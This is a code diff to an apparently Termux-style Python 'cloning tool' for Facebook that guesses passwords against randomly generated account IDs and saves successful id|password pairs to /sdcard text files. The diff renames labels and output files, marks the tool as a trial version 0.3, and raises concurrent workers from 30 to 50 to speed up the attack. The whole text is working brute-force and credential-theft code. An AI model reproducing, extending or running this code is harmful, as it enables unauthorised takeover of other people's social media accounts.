@@ -82,10 +82,10 @@ logo = ("""
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ┃ [\033[1;91m✓\033[1;92m] CREATOR   \033[1;91m: \033[1;92mPAPA NINS       
  ┃ [\033[1;91m✓\033[1;92m] TOOL      \033[1;91m: \033[1;92mCLONING TOOL             
- ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92mFREE                       
+ ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92mTRIAL                       
  ┃ [\033[1;91m✓\033[1;92m] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                    
  ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92mwww.facebook.com/100080607586393              
- ┃ [\033[1;91m✓\033[1;92m] VERSION \033[1;91m: \033[1;92m0.2          
+ ┃ [\033[1;91m✓\033[1;92m] VERSION \033[1;91m: \033[1;92m0.3          
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
 def linex():
@@ -389,14 +389,14 @@ def api1(ids,names,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         print(f'\r\r\033[1;32m [NINS-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/AVI-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open(f'/sdcard/NINS-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
                                                 print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/AVI-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcard/NINS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
@@ -411,7 +411,7 @@ def api1(ids,names,passlist):
                         pass
 def ffb7(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [AVI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -439,7 +439,7 @@ def ffb7(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print(f'\r\r\x1b[38;5;126m [NINS-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open(f'/sdcard/NINS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -467,7 +467,7 @@ def bd():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
                         user.append(nmp)
-                with tred(max_workers=30) as sat:     
+                with tred(max_workers=50) as sat:     
                         clear()
                         tl = str(len(user))
                         print(f'\033[1;37m [+] Total account : \033[1;32m'+tl)
@@ -499,7 +499,7 @@ def gml():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(2,5))
                         user.append(nmp)
-                with tred(max_workers=30) as sat:     
+                with tred(max_workers=50) as sat:     
                         clear()
                         tl = str(len(user))
                         print(' Total account : \033[1;32m'+tl)
